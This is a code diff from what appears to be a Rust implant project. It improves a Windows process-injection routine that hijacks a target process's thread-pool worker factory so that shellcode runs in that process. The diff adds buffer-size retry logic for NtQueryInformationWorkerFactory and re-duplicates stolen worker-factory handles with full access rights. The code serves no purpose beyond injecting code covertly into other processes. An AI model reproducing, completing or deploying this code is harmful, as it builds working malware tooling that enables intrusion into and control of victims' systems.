@@ -910,28 +910,49 @@ unsafe fn threadless_enqueue(
     worker_factory_h: *mut c_void,
     shellcode_addr: usize,
 ) -> Result<(), String> {
-    let mut info = [0u8; WFBI_BUF];
+    // 8-byte aligned: the kernel writes LARGE_INTEGER fields.
+    let mut info64 = [0u64; WFBI_BUF / 8];
+    let mut cap = WFBI_BUF as u32;
     let mut ret_len: u32 = 0;
-    let qst = unsafe {
-        query_wf(
-            worker_factory_h,
-            WORKER_FACTORY_BASIC_INFORMATION,
-            info.as_mut_ptr() as *mut c_void,
-            info.len() as u32,
-            &mut ret_len,
-        )
-    };
-    if qst < 0 {
-        unsafe { close_handle(worker_factory_h) };
-        return Err(String::from(
-            "threadless: NtQueryInformationWorkerFactory(BasicInformation) failed",
-        ));
+    let mut qst: i32;
+    loop {
+        qst = unsafe {
+            query_wf(
+                worker_factory_h,
+                WORKER_FACTORY_BASIC_INFORMATION,
+                info64.as_mut_ptr() as *mut c_void,
+                cap,
+                &mut ret_len,
+            )
+        };
+        if qst >= 0 {
+            break;
+        }
+        const STATUS_INFO_LENGTH_MISMATCH: i32 = 0xC000_0004u32 as i32;
+        if qst != STATUS_INFO_LENGTH_MISMATCH || ret_len <= cap || ret_len > 0x1000 {
+            unsafe { close_handle(worker_factory_h) };
+            let mut s = String::from(
+                "threadless: NtQueryInformationWorkerFactory(BasicInformation) failed st=",
+            );
+            nyx_implant_core::fmt::push_decimal_u32(&mut s, qst as u32);
+            s.push_str(" ret=");
+            nyx_implant_core::fmt::push_decimal_u32(&mut s, ret_len);
+            return Err(s);
+        }
+        cap = ret_len;
+        if (cap as usize) > WFBI_BUF {
+            unsafe { close_handle(worker_factory_h) };
+            return Err(String::from(
+                "threadless: BasicInformation ReturnLength exceeds stack buf",
+            ));
+        }
     }
+    let info = info64.as_ptr() as *const u8;
     let start_routine = unsafe {
-        core::ptr::read_unaligned(info.as_ptr().add(WFBI_START_ROUTINE_OFF) as *const u64)
+        core::ptr::read_unaligned(info.add(WFBI_START_ROUTINE_OFF) as *const u64)
     } as usize;
     let total_workers = unsafe {
-        core::ptr::read_unaligned(info.as_ptr().add(WFBI_TOTAL_WORKER_OFF) as *const u32)
+        core::ptr::read_unaligned(info.add(WFBI_TOTAL_WORKER_OFF) as *const u32)
     };
     if start_routine == 0 || shellcode_addr == 0 {
         unsafe { close_handle(worker_factory_h) };
@@ -1447,6 +1468,24 @@ unsafe fn hijack_probe_handle(
     stats.qobj_ok = stats.qobj_ok.saturating_add(1);
     if object_type_is_tp_worker_factory(&info) {
         stats.tp = stats.tp.saturating_add(1);
+        // Identification only needs a same-access dup + NtQueryObject.
+        // Query/Set Information need WORKER_FACTORY_QUERY/SET — re-dup.
+        let mut upgraded: *mut c_void = core::ptr::null_mut();
+        let ok = unsafe {
+            dup_handle(
+                target_h,
+                handle_val as *mut c_void,
+                CUR_PROCESS,
+                core::ptr::addr_of_mut!(upgraded),
+                WORKER_FACTORY_ALL_ACCESS,
+                0,
+                0,
+            )
+        };
+        if ok != 0 && !upgraded.is_null() {
+            unsafe { close_handle(dup) };
+            return Ok(upgraded);
+        }
         return Ok(dup);
     }
     unsafe { close_handle(dup) };
